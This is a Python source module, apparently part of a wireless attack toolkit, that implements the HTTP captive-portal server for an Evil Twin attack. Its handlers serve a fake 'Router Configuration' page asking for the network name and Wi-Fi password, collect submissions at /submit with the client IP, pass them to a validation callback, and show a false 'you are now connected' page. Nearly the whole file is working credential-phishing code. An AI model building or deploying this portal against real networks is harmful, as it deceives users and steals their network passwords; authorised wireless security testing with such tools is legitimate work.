#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
HTTP server for captive portal.

Serves login pages and handles credential submissions for Evil Twin attacks.
"""

import os
import threading
import time
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse
from typing import Optional, Callable, Dict, Any
import socket

from ...util.color import Color
from ...util.logger import log_info, log_error, log_warning, log_debug


class PortalRequestHandler(BaseHTTPRequestHandler):
    """HTTP request handler for captive portal."""
    
    # Class variables set by PortalServer
    template_renderer = None
    credential_callback = None
    request_log_callback = None
    server_instance = None
    
    def log_message(self, format, *args):
        """Override to use our logging system."""
        message = format % args
        log_debug('Portal', f'{self.client_address[0]} - {message}')
        
        # Call request log callback if set
        if self.request_log_callback:
            try:
                self.request_log_callback(self.client_address[0], message)
            except Exception as e:
                log_error('Portal', f'Error in request log callback: {e}', e)
    
    def do_GET(self):
        """Handle GET requests."""
        try:
            client_ip = self.client_address[0]
            path = self.path
            
            log_debug('Portal', f'GET {path} from {client_ip}')
            
            # Parse URL
            parsed = urlparse(path)
            
            # Serve static files
            if parsed.path.startswith('/static/'):
                self._serve_static_file(parsed.path)
                return
            
            # Check for success page request
            if parsed.path == '/success':
                self._serve_success_page()
                return
            
            # Check for error page request
            if parsed.path == '/error':
                self._serve_error_page()
                return
            
            # All other requests get the login page
            self._serve_login_page()
            
        except Exception as e:
            log_error('Portal', f'Error handling GET request: {e}', e)
            self._send_error_response(500, 'Internal Server Error')
    
    def do_POST(self):
        """Handle POST requests (credential submissions)."""
        try:
            client_ip = self.client_address[0]
            path = self.path
            
            log_debug('Portal', f'POST {path} from {client_ip}')
            
            # Only handle POST to /submit
            if path != '/submit':
                self._send_error_response(404, 'Not Found')
                return
            
            # Read POST data
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode('utf-8')
            
            # Parse form data
            form_data = parse_qs(post_data)
            
            # Extract credentials
            ssid = form_data.get('ssid', [''])[0]
            password = form_data.get('password', [''])[0]
            
            log_info('Portal', f'Credential submission from {client_ip}: SSID={ssid}')
            
            # Validate credentials via callback
            if self.credential_callback:
                try:
                    is_valid = self.credential_callback(ssid, password, client_ip)
                    
                    if is_valid:
                        log_info('Portal', f'Valid credentials from {client_ip}')
                        self._redirect_to_success()
                    else:
                        log_info('Portal', f'Invalid credentials from {client_ip}')
                        self._redirect_to_error()
                        
                except Exception as e:
                    log_error('Portal', f'Error in credential callback: {e}', e)
                    self._redirect_to_error()
            else:
                # No callback, just redirect to success
                log_warning('Portal', 'No credential callback set')
                self._redirect_to_success()
            
        except Exception as e:
            log_error('Portal', f'Error handling POST request: {e}', e)
            self._send_error_response(500, 'Internal Server Error')
    
    def _serve_login_page(self):
        """Serve the login page (optimized with caching)."""
        try:
            # Try to get cached template from server instance
            html = None
            if self.server_instance:
                html = self.server_instance.get_cached_template('login')
            
            # Fallback to rendering if not cached
            if not html:
                if self.template_renderer:
                    html = self.template_renderer.render_login()
                else:
                    html = self._get_default_login_page()
            
            self._send_html_response(html)
            
        except Exception as e:
            log_error('Portal', f'Error serving login page: {e}', e)
            self._send_error_response(500, 'Internal Server Error')
    
    def _serve_success_page(self):
        """Serve the success page (optimized with caching)."""
        try:
            # Try to get cached template from server instance
            html = None
            if self.server_instance:
                html = self.server_instance.get_cached_template('success')
            
            # Fallback to rendering if not cached
            if not html:
                if self.template_renderer:
                    html = self.template_renderer.render_success()
                else:
                    html = self._get_default_success_page()
            
            self._send_html_response(html)
            
        except Exception as e:
            log_error('Portal', f'Error serving success page: {e}', e)
            self._send_error_response(500, 'Internal Server Error')
    
    def _serve_error_page(self):
        """Serve the error page (optimized with caching)."""
        try:
            # Try to get cached template from server instance
            html = None
            if self.server_instance:
                html = self.server_instance.get_cached_template('error')
            
            # Fallback to rendering if not cached
            if not html:
                if self.template_renderer:
                    html = self.template_renderer.render_error()
                else:
                    html = self._get_default_error_page()
            
            self._send_html_response(html)
            
        except Exception as e:
            log_error('Portal', f'Error serving error page: {e}', e)
            self._send_error_response(500, 'Internal Server Error')
    
    def _serve_static_file(self, path):
        """Serve static files (CSS, images, etc.) with caching optimization."""
        try:
            # Remove /static/ prefix
            file_path = path[8:]  # Remove '/static/'
            filename = os.path.basename(file_path)
            
            # Try to get cached static file from server instance
            cached = None
            if self.server_instance:
                cached = self.server_instance.get_cached_static(filename)
            
            if cached:
                # Serve from cache (much faster)
                content, content_type = cached
                self.send_response(200)
                self.send_header('Content-Type', content_type)
                self.send_header('Content-Length', len(content))
                self.send_header('Cache-Control', 'public, max-age=3600')  # Cache for 1 hour
                self.end_headers()
                self.wfile.write(content)
                return
            
            # Fallback to file system if not cached
            portal_dir = os.path.dirname(os.path.abspath(__file__))
            static_dir = os.path.join(portal_dir, 'static')
            full_path = os.path.join(static_dir, file_path)
            
            # Security check: ensure file is within static directory
            if not os.path.abspath(full_path).startswith(static_dir):
                self._send_error_response(403, 'Forbidden')
                return
            
            # Check if file exists
            if not os.path.exists(full_path):
                self._send_error_response(404, 'Not Found')
                return
            
            # Determine content type
            content_type = 'text/plain'
            if full_path.endswith('.css'):
                content_type = 'text/css'
            elif full_path.endswith('.js'):
                content_type = 'application/javascript'
            elif full_path.endswith('.png'):
                content_type = 'image/png'
            elif full_path.endswith('.jpg') or full_path.endswith('.jpeg'):
                content_type = 'image/jpeg'
            elif full_path.endswith('.gif'):
                content_type = 'image/gif'
            
            # Read and serve file
            with open(full_path, 'rb') as f:
                content = f.read()
            
            self.send_response(200)
            self.send_header('Content-Type', content_type)
            self.send_header('Content-Length', len(content))
            self.send_header('Cache-Control', 'public, max-age=3600')  # Cache for 1 hour
            self.end_headers()
            self.wfile.write(content)
            
        except Exception as e:
            log_error('Portal', f'Error serving static file {path}: {e}', e)
            self._send_error_response(500, 'Internal Server Error')
    
    def _send_html_response(self, html):
        """Send HTML response."""
        html_bytes = html.encode('utf-8')
        self.send_response(200)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.send_header('Content-Length', len(html_bytes))
        self.end_headers()
        self.wfile.write(html_bytes)
    
    def _send_error_response(self, code, message):
        """Send error response."""
        self.send_response(code)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.end_headers()
        html = f'<html><body><h1>{code} {message}</h1></body></html>'
        self.wfile.write(html.encode('utf-8'))
    
    def _redirect_to_success(self):
        """Redirect to success page."""
        self.send_response(302)
        self.send_header('Location', '/success')
        self.end_headers()
    
    def _redirect_to_error(self):
        """Redirect to error page."""
        self.send_response(302)
        self.send_header('Location', '/error')
        self.end_headers()
    
    def _get_default_login_page(self):
        """Get default login page HTML."""
        return '''<!DOCTYPE html>
<html>
<head>
    <title>Router Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }
        .container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        h1 { color: #333; text-align: center; margin-bottom: 30px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 5px; color: #666; }
        input[type="text"], input[type="password"] { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
        button:hover { background: #0056b3; }
        .info { text-align: center; color: #666; font-size: 14px; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Router Configuration</h1>
        <form method="POST" action="/submit">
            <div class="form-group">
                <label for="ssid">Network Name (SSID):</label>
                <input type="text" id="ssid" name="ssid" required>
            </div>
            <div class="form-group">
                <label for="password">Password:</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit">Connect</button>
        </form>
        <div class="info">
            Please enter your network credentials to continue.
        </div>
    </div>
</body>
</html>'''
    
    def _get_default_success_page(self):
        """Get default success page HTML."""
        return '''<!DOCTYPE html>
<html>
<head>
    <title>Connection Successful</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }
        .container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; }
        h1 { color: #28a745; }
        p { color: #666; line-height: 1.6; }
    </style>
</head>
<body>
    <div class="container">
        <h1>✓ Success!</h1>
        <p>Your network credentials have been verified.</p>
        <p>You are now connected to the network.</p>
    </div>
</body>
</html>'''
    
    def _get_default_error_page(self):
        """Get default error page HTML."""
        return '''<!DOCTYPE html>
<html>
<head>
    <title>Connection Failed</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }
        .container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; }
        h1 { color: #dc3545; }
        p { color: #666; line-height: 1.6; }
        a { display: inline-block; margin-top: 20px; padding: 10px 20px; background: #007bff; color: white; text-decoration: none; border-radius: 4px; }
        a:hover { background: #0056b3; }
    </style>
</head>
<body>
    <div class="container">
        <h1>✗ Connection Failed</h1>
        <p>The credentials you entered are incorrect.</p>
        <p>Please try again.</p>
        <a href="/">Try Again</a>
    </div>
</body>
</html>'''


class PortalServer:
    """
    HTTP server for captive portal.
    
    Serves login pages and handles credential submissions.
    Optimized for fast response times and low memory usage.
    """
    
    def __init__(self, host='0.0.0.0', port=80, template_renderer=None):
        """
        Initialize portal server.
        
        Args:
            host: Host to bind to (default: 0.0.0.0 for all interfaces)
            port: Port to listen on (default: 80)
            template_renderer: Optional template renderer for custom pages
        """
        self.host = host
        self.port = port
        self.template_renderer = template_renderer
        self.credential_callback = None
        self.request_log_callback = None
        
        self.server = None
        self.server_thread = None
        self.running = False
        
        # Performance optimizations: Pre-render and cache templates
        self._template_cache = {}
        self._cache_templates()
        
        # Performance optimizations: Pre-load static files into memory
        self._static_cache = {}
        self._cache_static_files()
        
        log_debug('Portal', f'Initialized server for {host}:{port} with template caching')
    
    def set_credential_callback(self, callback: Callable[[str, str, str], bool]):
        """
        Set callback for credential validation.
        
        Args:
            callback: Function(ssid, password, client_ip) -> bool
        """
        self.credential_callback = callback
        log_debug('Portal', 'Credential callback set')
    
    def set_request_log_callback(self, callback: Callable[[str, str], None]):
        """
        Set callback for request logging.
        
        Args:
            callback: Function(client_ip, message) -> None
        """
        self.request_log_callback = callback
        log_debug('Portal', 'Request log callback set')
    
    def start(self) -> bool:
        """
        Start the HTTP server in a background thread.
        
        Returns:
            True if started successfully, False otherwise
        """
        try:
            if self.running:
                log_warning('Portal', 'Server already running')
                return True
            
            # Set class variables for request handler
            PortalRequestHandler.template_renderer = self.template_renderer
            PortalRequestHandler.credential_callback = self.credential_callback
            PortalRequestHandler.request_log_callback = self.request_log_callback
            PortalRequestHandler.server_instance = self
            
            # Create HTTP server
            self.server = HTTPServer((self.host, self.port), PortalRequestHandler)
            
            # Start server in background thread
            self.server_thread = threading.Thread(target=self._run_server, daemon=True)
            self.server_thread.start()
            
            # Wait a moment to ensure server started
            time.sleep(0.5)
            
            self.running = True
            log_info('Portal', f'Server started on {self.host}:{self.port}')
            
            Color.pl('{+} {G}Captive portal started{W} on {C}http://%s:%d{W}' % (
                self.host if self.host != '0.0.0.0' else '192.168.100.1', 
                self.port))
            
            return True
            
        except OSError as e:
            if e.errno == 98:  # Address already in use
                log_error('Portal', f'Port {self.port} already in use')
                Color.pl('{!} {R}Port {O}%d{R} already in use{W}' % self.port)
                Color.pl('{!} {O}Try stopping other web servers or use a different port{W}')
            else:
                log_error('Portal', f'Failed to start server: {e}', e)
                Color.pl('{!} {R}Failed to start captive portal:{W} %s' % str(e))
            return False
            
        except Exception as e:
            log_error('Portal', f'Failed to start server: {e}', e)
            Color.pl('{!} {R}Failed to start captive portal:{W} %s' % str(e))
            return False
    
    def _run_server(self):
        """Run the HTTP server (called in background thread)."""
        try:
            log_debug('Portal', 'Server thread started')
            self.server.serve_forever()
        except Exception as e:
            log_error('Portal', f'Server thread error: {e}', e)
        finally:
            log_debug('Portal', 'Server thread stopped')
    
    def stop(self):
        """Stop the HTTP server."""
        try:
            if not self.running:
                return
            
            log_debug('Portal', 'Stopping server')
            
            if self.server:
                self.server.shutdown()
                self.server.server_close()
            
            if self.server_thread and self.server_thread.is_alive():
                self.server_thread.join(timeout=2)
            
            self.running = False
            log_info('Portal', 'Server stopped')
            
            Color.pl('{+} Captive portal stopped')
            
        except Exception as e:
            log_error('Portal', f'Error stopping server: {e}', e)
    
    def is_running(self) -> bool:
        """
        Check if server is running.
        
        Returns:
            True if running, False otherwise
        """
        return self.running and self.server is not None
    
    def get_stats(self) -> Dict[str, Any]:
        """
        Get server statistics.
        
        Returns:
            Dictionary with server stats
        """
        return {
            'running': self.running,
            'host': self.host,
            'port': self.port,
            'has_credential_callback': self.credential_callback is not None,
            'has_template_renderer': self.template_renderer is not None
        }
    
    def _cache_templates(self):
        """Pre-render and cache all templates for faster response times."""
        try:
            if self.template_renderer:
                # Cache rendered templates
                self._template_cache['login'] = self.template_renderer.render_login()
                self._template_cache['success'] = self.template_renderer.render_success()
                self._template_cache['error'] = self.template_renderer.render_error()
                log_debug('Portal', 'Templates pre-rendered and cached')
            else:
                # Cache default templates by calling static methods
                self._template_cache['login'] = self._get_default_login_page()
                self._template_cache['success'] = self._get_default_success_page()
                self._template_cache['error'] = self._get_default_error_page()
                log_debug('Portal', 'Default templates cached')
        except Exception as e:
            log_warning('Portal', f'Failed to cache templates: {e}')
            self._template_cache = {}
    
    def _get_default_login_page(self):
        """Get default login page HTML."""
        return '''<!DOCTYPE html>
<html>
<head>
    <title>Router Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }
        .container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        h1 { color: #333; text-align: center; margin-bottom: 30px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 5px; color: #666; }
        input[type="text"], input[type="password"] { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
        button:hover { background: #0056b3; }
        .info { text-align: center; color: #666; font-size: 14px; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Router Configuration</h1>
        <form method="POST" action="/submit">
            <div class="form-group">
                <label for="ssid">Network Name (SSID):</label>
                <input type="text" id="ssid" name="ssid" required>
            </div>
            <div class="form-group">
                <label for="password">Password:</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit">Connect</button>
        </form>
        <div class="info">
            Please enter your network credentials to continue.
        </div>
    </div>
</body>
</html>'''
    
    def _get_default_success_page(self):
        """Get default success page HTML."""
        return '''<!DOCTYPE html>
<html>
<head>
    <title>Connection Successful</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }
        .container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; }
        h1 { color: #28a745; }
        p { color: #666; line-height: 1.6; }
    </style>
</head>
<body>
    <div class="container">
        <h1>✓ Success!</h1>
        <p>Your network credentials have been verified.</p>
        <p>You are now connected to the network.</p>
    </div>
</body>
</html>'''
    
    def _get_default_error_page(self):
        """Get default error page HTML."""
        return '''<!DOCTYPE html>
<html>
<head>
    <title>Connection Failed</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }
        .container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; }
        h1 { color: #dc3545; }
        p { color: #666; line-height: 1.6; }
        a { display: inline-block; margin-top: 20px; padding: 10px 20px; background: #007bff; color: white; text-decoration: none; border-radius: 4px; }
        a:hover { background: #0056b3; }
    </style>
</head>
<body>
    <div class="container">
        <h1>✗ Connection Failed</h1>
        <p>The credentials you entered are incorrect.</p>
        <p>Please try again.</p>
        <a href="/">Try Again</a>
    </div>
</body>
</html>'''
    
    def _cache_static_files(self):
        """Pre-load static files into memory for faster serving."""
        try:
            portal_dir = os.path.dirname(os.path.abspath(__file__))
            static_dir = os.path.join(portal_dir, 'static')
            
            if not os.path.exists(static_dir):
                return
            
            # Cache common static files (CSS, small images)
            for filename in os.listdir(static_dir):
                file_path = os.path.join(static_dir, filename)
                
                # Only cache files under 1MB to avoid excessive memory usage
                if os.path.isfile(file_path) and os.path.getsize(file_path) < 1024 * 1024:
                    try:
                        with open(file_path, 'rb') as f:
                            content = f.read()
                        
                        # Determine content type
                        content_type = 'text/plain'
                        if filename.endswith('.css'):
                            content_type = 'text/css'
                        elif filename.endswith('.js'):
                            content_type = 'application/javascript'
                        elif filename.endswith('.png'):
                            content_type = 'image/png'
                        elif filename.endswith('.jpg') or filename.endswith('.jpeg'):
                            content_type = 'image/jpeg'
                        elif filename.endswith('.gif'):
                            content_type = 'image/gif'
                        
                        self._static_cache[filename] = (content, content_type)
                        log_debug('Portal', f'Cached static file: {filename}')
                    except Exception as e:
                        log_debug('Portal', f'Failed to cache {filename}: {e}')
            
            if self._static_cache:
                log_debug('Portal', f'Cached {len(self._static_cache)} static files')
        except Exception as e:
            log_warning('Portal', f'Failed to cache static files: {e}')
            self._static_cache = {}
    
    def get_cached_template(self, template_name: str) -> Optional[str]:
        """
        Get cached template.
        
        Args:
            template_name: Name of template ('login', 'success', 'error')
            
        Returns:
            Cached template HTML or None
        """
        return self._template_cache.get(template_name)
    
    def get_cached_static(self, filename: str) -> Optional[tuple]:
        """
        Get cached static file.
        
        Args:
            filename: Name of static file
            
        Returns:
            Tuple of (content, content_type) or None
        """
        return self._static_cache.get(filename)
    
    def __del__(self):
        """Cleanup on deletion."""
        import contextlib
        with contextlib.suppress(Exception):
            self.stop()
            # Clear caches to free memory
            self._template_cache.clear()
            self._static_cache.clear()
